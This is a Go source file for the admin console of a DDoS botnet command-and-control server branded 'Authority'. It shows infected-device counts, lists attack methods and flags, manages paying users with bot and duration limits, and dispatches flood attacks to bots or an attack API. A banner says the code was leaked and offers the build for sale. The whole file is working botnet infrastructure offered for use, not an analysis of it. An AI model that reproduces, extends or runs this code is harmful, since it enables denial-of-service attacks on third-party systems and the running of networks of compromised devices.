package cnc

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/alexeyco/simpletable"
	"golang.org/x/crypto/ssh"
)

type Admin struct {
	conn     ssh.Channel
	userInfo *AccountInfo
}

func (sess *Admin) Print(shit string) {
	sess.conn.Write([]byte(shit))
}
func (sess *Admin) Println(shit string) {
	sess.conn.Write([]byte(shit + "\r\n"))
}

func NewAdmin(conn ssh.Channel, acc *AccountInfo) *Admin {
	return &Admin{
		conn:     conn,
		userInfo: acc,
	}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte{
		255, 251, 1,
		255, 251, 3,
		255, 252, 34,
	})

	this.conn.Write([]byte("\r\n\033[0m"))
	go func() {
		i := 0
		for {
			var BotCount int
			if Clist.Count() > this.userInfo.maxBots && this.userInfo.maxBots != -1 {
				BotCount = this.userInfo.maxBots
			} else {
				BotCount = Clist.Count()
			}
			frames := []string{"A", "Au", "Aut", "Auth", "Autho", "Author", "Authori", "Authorit", "Authority", "Authority.", "Authority", "Authorit", "Authori", "Author", "Autho", "Auth", "Aut", "Au", "A"}
			this.conn.Write([]byte("\033[?25h"))
			time.Sleep(time.Second)
			this.conn.Write([]byte("\033[?25l"))
			if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;["+frames[i%len(frames)]+"] | Infected Devices [%d] | Running Attacks [%d] | Welcome [%s]\007", BotCount, Db.fetchRunningAttacks(), this.userInfo.username))); err != nil {
				this.conn.Close()
				break
			}
			i++
			if i%60 == 0 {
			}
		}
	}()
	this.conn.Write([]byte("\033[2J\033[1H")) //display main header #1
	this.conn.Write([]byte("\033[38;5;241m╔═════════════════════════════╗\r\n" +
		"\033[38;5;241m║  \033[38;2;191;0;0m╔═╗╦ ╦╔╦╗╦ ╦╔═╗╦═╗╦╔╦╗╦ ╦  \033[38;5;241m║\r\n" +
		"\033[38;5;241m║  \033[38;2;191;0;0m╠═╣║ ║ ║ ╠═╣║ ║╠╦╝║ ║ ╚╦╝  \033[38;5;241m║\r\n" +
		"\033[38;5;241m║  \033[38;2;191;0;0m╩ ╩╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩  ╩   \033[38;5;241m║\r\n" +
		"\033[38;5;241m╚══════════╦══════════════════╩══════════════════════════════╗\r\n" +
		"           \033[38;5;241m║ \033[38;2;191;0;0mYour Authority Is Hidden, Welcome to Authority.\033[38;5;241m ║\r\n" +
		"           \033[38;5;241m╚═════════════════════════════════════════════════╝\r\n"))
	this.conn.Write([]byte("\r\n"))

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte(fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m@\033[38;2;191;0;0mAuthority\033[38;5;241m#: ", this.userInfo.username) + ""))
		cmdd, err := this.ReadLine(false)
		cmds := strings.Split(cmdd, " ")
		cmd := cmds[0]

		if cmd == "" {
			continue
		}
		if err != nil {
			break
		}

		if cmd == "C" || cmd == "c" || cmd == "cls" || cmd == "CLS" || cmd == "Cls" || cmd == "CLEAR" || cmd == "clear" { // clear screen
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[38;5;241m╔═════════════════════════════╗\r\n" +
				"\033[38;5;241m║  \033[38;2;191;0;0m╔═╗╦ ╦╔╦╗╦ ╦╔═╗╦═╗╦╔╦╗╦ ╦  \033[38;5;241m║\r\n" +
				"\033[38;5;241m║  \033[38;2;191;0;0m╠═╣║ ║ ║ ╠═╣║ ║╠╦╝║ ║ ╚╦╝  \033[38;5;241m║\r\n" +
				"\033[38;5;241m║  \033[38;2;191;0;0m╩ ╩╚═╝ ╩ ╩ ╩╚═╝╩╚═╩ ╩  ╩   \033[38;5;241m║\r\n" +
				"\033[38;5;241m╚══════════╦══════════════════╩══════════════════════════════╗\r\n" +
				"           \033[38;5;241m║ \033[38;2;191;0;0mYour Authority Is Hidden, Welcome to Authority.\033[38;5;241m ║\r\n" +
				"           \033[38;5;241m╚═════════════════════════════════════════════════╝\r\n"))
			this.conn.Write([]byte("\r\n"))
			continue
		}

		if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mName\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDescription\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mPermissions\033[38;5;241m."},
				},
			}
			r := []*simpletable.Cell{
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "help")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "Display the Authority Help menu.")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "nil")},
			}
			table.Body.Cells = append(table.Body.Cells, r)
			r = []*simpletable.Cell{
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "methods")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "Display the Authority Attack Vectors menu.")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "nil")},
			}
			table.Body.Cells = append(table.Body.Cells, r)
			r = []*simpletable.Cell{
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "stats")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "Display the Authority Statistics menu.")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "nil")},
			}
			table.Body.Cells = append(table.Body.Cells, r)
			table.SetStyle(simpletable.StyleUnicode)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			continue
		}

		if cmd == "METHODS" || cmd == "methods" { // display methods and how to send an attack
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mName\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mFlags\033[38;5;241m."},
				},
			}
			for atk, atkInfo := range AttackInfoLookup {
				var flags string
				for flag, flagInfo := range flagInfoLookup {
					for i, flg := range atkInfo.AttackFlags {
						if i >= 3 {
							break
						}
						if flagInfo.flagID == flg {
							if flags != "" {
								flags += "," + flag
							} else {
								flags += flag
							}
						}
					}
				}
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", atk[1:])},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", flags)},
				}
				table.Body.Cells = append(table.Body.Cells, r)
			}
			r := []*simpletable.Cell{
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", "usage")},
				{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", ".[method] [target] [duration]")},
			}
			table.SetStyle(simpletable.StyleUnicode)
			table.Body.Cells = append(table.Body.Cells, r)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			/*for atk, atkInfo := range AttackInfoLookup {
				var meth string
				meth = meth + "║ " + atk[1:] + " [ip] [time] "
				for flag, flagInfo := range flagInfoLookup {
					for i, flg := range atkInfo.AttackFlags {
						if i >= 3 {
							break
						}
						if flagInfo.flagID == flg {
							meth = meth + "[" + flag + "] "
						}
					}
				}
				this.conn.Write([]byte(Fade([]int{191, 0, 0}, []int{255, 255, 255}, meth) + "\r\n"))
			}*/
			/*for atk, _ := range apiAttackInfoLookup {
				var meth string
				meth = meth + "║ " + atk[1:] + " [ip] [time] "
				this.conn.Write([]byte(Fade([]int{191, 0, 0}, []int{255, 255, 255}, meth) + "\r\n"))
			}
			this.conn.Write([]byte(Fade([]int{191, 0, 0}, []int{255, 255, 255}, "║ Usage: .[method] [ip] [time] [flags]\r\n")))*/
			continue
		}
		if cmd == "flags" {
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mName\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDescription\033[38;5;241m."},
				},
			}
			for flag, flagInfo := range flagInfoLookup {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", flag)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", flagInfo.flagDescription)},
				}
				table.Body.Cells = append(table.Body.Cells, r)
			}
			table.SetStyle(simpletable.StyleUnicode)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			continue
		}

		if cmd == "RULES" || cmd == "rules" {
			this.conn.Write([]byte(fmt.Sprintf("\033[97m       |  " + Fade([]int{191, 0, 0}, []int{255, 255, 255}, "Hellsing") + "  Rules  |                                              \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m ════════════════════════════════  \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mHello \033[1;31m" + this.userInfo.username + " !                           \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mDon't spam! & Don't share! Don't spam me for admin!        \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mDon't attack to goverment sites.                           \r\n")))
                        this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mThis Source Is Leaked by Reflect        \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m  \033[01;97mIf you wanna buy this source build, dm me.                 \r\n")))
			this.conn.Write([]byte("\033\x1b[1;31m  Discord\033[1;37m: Selfrep#1337     \r\n"))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m ════════════════════════════════                                       \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[1;31m\r\n")))
			continue
		}

		if cmd == "changelog" {
			continue
		}

		if cmd == "STATS" || cmd == "stats" {
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mUsername\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mCount\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mMax Time\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mCooldown\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mAdministrator\033[38;5;241m."},
				},
			}
			users := Db.GetUsers()
			for _, user := range users {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", user.Username)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", user.MaxCount)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", user.MaxTime)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", user.Cooldown)},
					{Align: simpletable.AlignCenter, Text: formatBool(user.Admin) + "\033[38;5;241m."},
				}
				table.Body.Cells = append(table.Body.Cells, r)
			}
			table.SetStyle(simpletable.StyleUnicode)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			continue
		}

		if cmd == "logout" || cmd == "LOGOUT" {
			this.conn.Close()
			return
		}

		botCount = this.userInfo.maxBots

		if this.userInfo.admin == 1 && cmd == "users" {
			if len(cmds) < 2 {
				this.conn.Write([]byte("\033[1;31madd (reg/admin)\r\n"))
				continue
			}
			switch cmds[1] {
			case "add":
				this.conn.Write([]byte("\033[38;2;191;0;0mClient Username\033[38;5;241m.\033[38;2;191;0;0m This will be used to login\033[38;5;241m.\r\nUsername > "))
				new_un, err := this.ReadLine(false)
				if err != nil {
					return
				}
				this.conn.Write([]byte("\033[38;2;191;0;0mClient Password\033[38;5;241m.\033[38;2;191;0;0m This will be used to login\033[38;5;241m.\r\nPassword > "))
				new_pw, err := this.ReadLine(false)
				if err != nil {
					return
				}
				this.conn.Write([]byte("\033[38;2;191;0;0mClient Botcount\033[38;5;241m.\033[38;2;191;0;0m This will be used to limit bots\033[38;5;241m.\r\nCount > "))
				max_bots_str, err := this.ReadLine(false)
				if err != nil {
					return
				}
				max_bots, err := strconv.Atoi(max_bots_str)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
					continue
				}
				this.conn.Write([]byte("\033[38;2;191;0;0mClient Attack\033[38;5;241m.\033[38;2;191;0;0m This will be used to limit Attack duration.\033[38;5;241m.\r\nDuration > "))
				duration_str, err := this.ReadLine(false)
				if err != nil {
					return
				}
				duration, err := strconv.Atoi(duration_str)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
					continue
				}
				this.conn.Write([]byte("\033[38;2;191;0;0mClient Cooldown\033[38;5;241m.\033[38;2;191;0;0m This will be used to stop spam\033[38;5;241m.\r\nCooldown > "))
				cooldown_str, err := this.ReadLine(false)
				if err != nil {
					return
				}
				cooldown, err := strconv.Atoi(cooldown_str)
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
					continue
				}
				this.conn.Write([]byte(fmt.Sprintf("\033[2J\033[1H"+
					"Authority.\r\n"+
					"Username %s.\r\n"+
					"Attack Duration %d.\r\n"+
					"Attack Cooldown %d.\r\n"+
					"Client Max Count %d.\r\n", new_un, duration, cooldown, max_bots)))
				if !Db.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
					this.conn.Write([]byte(fmt.Sprintf("\t\033[38;2;191;0;0m%s\033[38;5;241m.\r\n", "Failed to create new user. An unknown error occured.")))
				} else {
					this.conn.Write([]byte("\t\033[38;2;191;0;0mUser account created\033[38;5;241m.\033[0m\r\n"))
				}
				break
			}
			continue
		}
		if cmd == "running" {
			atks, err := Db.RunningAttacks()
			if err != nil {
				continue
			}
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0m#\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mTarget\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mVector\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDuration\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mClients\033[38;5;241m."},
				},
			}
			for i, atk := range atks {
				info := strings.Split(atk.Command, " ")
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", i)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", info[1])},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", info[0][1:])},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", info[2])},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", Clist.Count())},
				}
				table.Body.Cells = append(table.Body.Cells, r)
			}
			table.SetStyle(simpletable.StyleUnicode)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			continue
		}
		if this.userInfo.admin == 1 && cmd == "removeuser" {
			this.conn.Write([]byte("\033[1;31mUsername: \033[0;35m"))
			rm_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte(" \033[1;31mAre You Sure You Want To Remove \033[1;31m" + rm_un + "?\033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !Db.RemoveUser(rm_un) {
				this.conn.Write([]byte(fmt.Sprintf("\033[01;97mUnable to remove users, sorry pal (`-`)\r\n")))
			} else {
				this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
			}
			continue
		}

		botCount = this.userInfo.maxBots

		if this.userInfo.admin == 1 && cmd == "addadmin" {
			this.conn.Write([]byte("\033[0mAdmin User's Username:\033[1;31m "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mAdmin User's Password:\033[1;31m "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[0mAdmin User's Botcount\033[1;31m(\033[0m-1 for access to all\033[1;31m)\033[0m:\033[1;31m "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
				continue
			}
			this.conn.Write([]byte("\033[0mAdmin User's Attack Duration\033[1;31m(\033[0m-1 for none\033[1;31m)\033[0m:\033[1;31m "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
				continue
			}
			this.conn.Write([]byte("\033[0mAdmin User's Cooldown\033[1;31m(\033[0m0 for none\033[1;31m)\033[0m:\033[1;31m "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[0m- New admin user's  info - \r\n- Username - \033[1;31m" + new_un + "\r\n\033[0m- Password - \033[1;31m" + new_pw + "\r\n\033[0m- Bots - \033[1;31m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[1;31m" + duration_str + "\r\n\033[0m- Cooldown - \033[1;31m" + cooldown_str + "   \r\n\033[0mContinue? \033[1;31m(\033[01;32my\033[1;31m/\033[01;97mn\033[1;31m) "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !Db.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
			} else {
				this.conn.Write([]byte("\033[32;1mAdmin User's  added successfully.\033[0m\r\n"))
			}
			continue
		}

		if cmd == "bots" || cmd == "BOTS" {
			botCount = Clist.Count()
			table := simpletable.New()
			table.Header = &simpletable.Header{
				Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDevice\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mCount\033[38;5;241m."},
					{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mPercent\033[38;5;241m."},
				},
			}
			m := Clist.Distribution()
			for name, count := range m {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", name)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", count)},
					{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%.2f\033[38;5;241m.", (float64(float64(count)/float64(Clist.Count())) * 100))},
				}
				table.Body.Cells = append(table.Body.Cells, r)
			}
			table.SetStyle(simpletable.StyleUnicode)
			this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
			continue
		}

		atk, err := NewAttack(cmdd, this.userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
		} else {
			buf, err := atk.Build()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
			} else {
				if strings.Contains(string(buf[0]), "http://") {
					if can, err := Db.CanLaunchAttack(this.userInfo.username, atk.Duration, cmdd, botCount, 0); !can {
						this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
						continue
					} else if !Db.ContainsWhitelistedTargets(atk) {
						LaunchAPI(string(buf[0]))
						table := simpletable.New()
						table.Header = &simpletable.Header{
							Cells: []*simpletable.Cell{
								{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mTarget\033[38;5;241m."},
								{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mClients\033[38;5;241m."},
								{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDuration\033[38;5;241m."},
							},
						}
						r := []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", cmd[0])},
							{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", cmd[1])},
							{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", cmd[2])},
						}
						table.Body.Cells = append(table.Body.Cells, r)
						table.SetStyle(simpletable.StyleUnicode)
						this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
					}
					continue
				}
				if can, err := Db.CanLaunchAttack(this.userInfo.username, atk.Duration, cmdd, botCount, 0); !can {
					this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
				} else if !Db.ContainsWhitelistedTargets(atk) {
					Clist.QueueBuf(buf, botCount, botCatagory)
					var YotCount int
					if Clist.Count() > this.userInfo.maxBots && this.userInfo.maxBots != -1 {
						YotCount = this.userInfo.maxBots
					} else {
						YotCount = Clist.Count()
					}
					table := simpletable.New()
					table.Header = &simpletable.Header{
						Cells: []*simpletable.Cell{
							{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mVector\033[38;5;241m."},
							{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mTarget\033[38;5;241m."},
							{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mClients\033[38;5;241m."},
							{Align: simpletable.AlignCenter, Text: "\033[38;2;191;0;0mDuration\033[38;5;241m."},
						},
					}
					r := []*simpletable.Cell{
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", string(cmds[0]))},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", string(cmds[1]))},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%d\033[38;5;241m.", YotCount)},
						{Align: simpletable.AlignCenter, Text: fmt.Sprintf("\033[38;2;191;0;0m%s\033[38;5;241m.", string(cmds[2]))},
					}
					table.Body.Cells = append(table.Body.Cells, r)
					table.SetStyle(simpletable.StyleUnicode)
					this.Println("\033[38;5;241m" + strings.ReplaceAll(table.String(), "\n", "\r\n\033[38;5;241m"))
				} else {
					fmt.Println("Blocked attack by " + this.userInfo.username + " to whitelisted prefix")
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	var ln []byte
	bufPos := 0

	for {
		buf := make([]byte, 1)
		_, err := this.conn.Read(buf)
		if err != nil {
			return "", err
		}
		switch buf[0] {
		case 27:
			break
		case 13:
			this.conn.Write([]byte("\r\n"))
			return string(ln), nil
		case 127:
			if len(ln) == 0 {
				break
			}

			bufPos--
			this.conn.Write([]byte{127})
			ln = ln[:len(ln)-1]
			break
		default:
			bufPos++
			this.conn.Write([]byte(string(buf)))
			ln = append(ln, buf...)
		}
	}
	return string(ln), nil
}

func formatBool(input bool) string {

	if input == false {
		return "\x1b[31mfalse\x1b[0m"
	}

	return "\x1b[32mtrue\x1b[0m"
}
